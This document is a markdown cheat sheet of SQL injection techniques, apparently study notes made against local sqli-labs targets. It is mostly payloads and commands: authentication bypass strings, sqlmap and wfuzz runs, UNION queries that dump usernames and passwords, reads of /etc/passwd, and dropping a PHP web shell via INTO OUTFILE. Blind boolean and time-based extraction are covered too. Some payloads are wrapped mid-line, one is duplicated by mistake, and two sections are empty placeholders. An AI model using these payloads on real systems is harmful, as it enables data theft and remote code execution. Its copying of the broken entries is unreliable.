# SQLi

## Classification of SQLi
- In-Band
- Out-Band
- Inferential

## SQLi Techniques
- Returning All Records
```
SELECT * FROM users WHERE username = ' ' OR 1 = 1 --'
```
- Bypassing authentication
```
$query = "SELECT * FROM users WHERE username = '$user-
name' AND password = '$password'";

SELECT * FROM users WHERE username = " OR '1'='1' -- ' AND
password = 'pass';
```
**Fuzzing**
```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/
SQL.txt -d "username=FUZZ&password=ok&submit=Login"
http://127.0.0.1:8080/login.php
```

- SQLi Data Extraction Using UNION-Based
1. Both SELECT statement must returns the same number of columns
2. The data types in both SELECT should always be the same
```
no example
```

## SQLmap
```
sqlmap -u http://127.0.0.1/sqlilabs/Less-2/?id=1 –dbs
```

## Determining the Number of Columns and the type
```
http://127.0.0.1/sqlilabs/Less-2/?id=1+order+by+1--
http://127.0.0.1/sqlilabs/Less-2/?id=1+order+by+2--
http://127.0.0.1/sqlilabs/Less-2/?id=1+order+by+3--
http://127.0.0.1/sqlilabs/Less-2/?id=1+order+by+4--

http://127.0.0.1/sqlilabs/Less-2/?id=1+union+select+
null,null,null--
```

## Determining the vulnerable columns
Force an always false answer to identify witch column may be vulnerable.
```
http://127.0.0.1/sqlilabs/Less-2/?id=- 1 +union+select+1,2,3--

http://127.0.0.1/sqlilabs/Less-2/?id=and 1 = 0 union select 1,2,3--
http://127.0.0.1/sqlilabs/Less-2/?id=1 and 1 = 0 union select 1,2,3--
```

## Fingerprinting the Database
```
SELECT * FROM users WHERE id=-1 union select version(),database()– LIMIT 0,1;
```

#### Enumerate Tables from Database
```bash
# query
union+select+null, group_concat(table_name ),null+from+ information_schema.tables +where+table_schema='security'--

# payload
http://127.0.0.1/sqlilabs/Less-2/?id=-1+union+select+null, group_concat(table_name) ,null+from+ information_schema.tables +where+table_schema="security"
```

#### Enumerate Columns from tables
```bash
# query
Union select null,group_concat(column_name),null from information_schema.columns where table_name="security"--

# payload
http://127.0.0.1/sqlilabs/Less-2/?id=-1+union+select+null, group_concat(table_name) ,null+from+ information_schema.tables +where+ table_schema="security"
```

#### Extracting Data from columns
```bash
# Query
Union select null,group_concat(username,0x3a,password),
null from security--

# Payloads
http://127.0.0.1/sqlilabs/Less-2/?id=-1+union+select+
null,group_concat(username,0x3a,password),null+from+us
ers--
```

# SQLi to RCE
**Check privileges of the user**
```bash
http://127.0.0.1/search.php?search=tmgm'UN
ION+SELECT+ALL+1,2,group_concat(privilege_
type),4+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES--+
```
FILE privilege allow user use LOAD_FILE() and "LOAD DATA INFILE"

## Read file
```bash
curl "http://127.0.0.1/search.php?search=tmgm'Union+SELECT+ALL+1,2,load_file('/etc/passwd'),4--+"
# string in hexadecimal
http://127.0.0.1/search.php?search=tmgm'Union+SELECT+
ALL+1,2,load_file(0x2f6574632f686f73746e616d65),4--+

'

# base64
http://127.0.0.1/search.php?search=tmgm'Union+SELECT
+ALL+1,2,To_base64(load_file(0x2f6574632f686f73746e6
16d65)),4--+
```

## Write file
```bash
UNION+SELECT+ALL+1,2,<?php system([\'cmd\']);?>,4 into
outfile "/var/www/html/shell.php"--+

# hexadecimal
http://127.0.0.1/search.php?search=tmgm'UNION+SELECT+AL
L+1,2,0x3c3f7068702073797374656d285b27636d64275d293b203
f3e,4+into+outfile+'/var/www/html/shell.php'--+
```

# Error-Based
Using suffiz and prefix
```bash
sqlmap -u vulnerable.com/index.php?id=1" --prefix "'))" --suffix "-- -" --dbms=mysql
```


# Booleand SQLi
```bash
http://vulnerablebak.com/index.php?users=all'+OR+1 = 1--+

http://vulnerablebak.com/index.php?users=all'+OR+
1 = 2--+
```

**Enumerating Database user**
```bash
'+OR+SUBSTRING(user(),1,1)='a';--+
```
With sqlmap
```bash
sqlmap -u "http://vunerablebank.com.com/admin.php?id=1"
--string="Welcome User"

sqlmap-u" http://vunerablebank.com.com/admin.php?id=1"
--string="Welcome,\x0aUser Name,\x0aLogout"
```

## Time-Based
```bash
IF(condition, true_statement, false_statement)

'OR IF(1 = 1, SLEEP(5), 0) -- -

time curl "http://127.0.0.1:8080/index.php?id=2"

time curl" http://127.0.0.1:8080/index.php?id='+OR+IF(1%3d1,+SLEEP(5),+0)%20--%20-
```

#### Enumerating Character length of Database Name
```bash
'OR IF(LENGTH((SELECT DATABASE())) = 4, SLEEP(5), 0) -- -
' OR IF(LENGTH((SELECT DATABASE())) = 5, SLEEP(5), 0) --
' OR IF(LENGTH((SELECT DATABASE())) = 6, SLEEP(5), 0) --
```
#### Enumerating Database Name
```bash
' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) =
ASCII('a'), SLEEP(5), 0) -- -

' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) =
ASCII('b'), SLEEP(5), 0) -- -

' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) =
ASCII('t'), SLEEP(5), 0) -- -

# checking the second character
' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 2, 1)) =
ASCII('b'), SLEEP(5), 0) -- -
```


# Second-Order SQLi
```bash
sqlmap -r sql.txt --second-url "http://localhost:8080/administrator/index.php" --dbs
```


# sqlmap tips
1. Use Verbose and debugging with the -v3!

## Using tamper scripts
#### JWT-Based SQL Injection
```
Check book for the example
```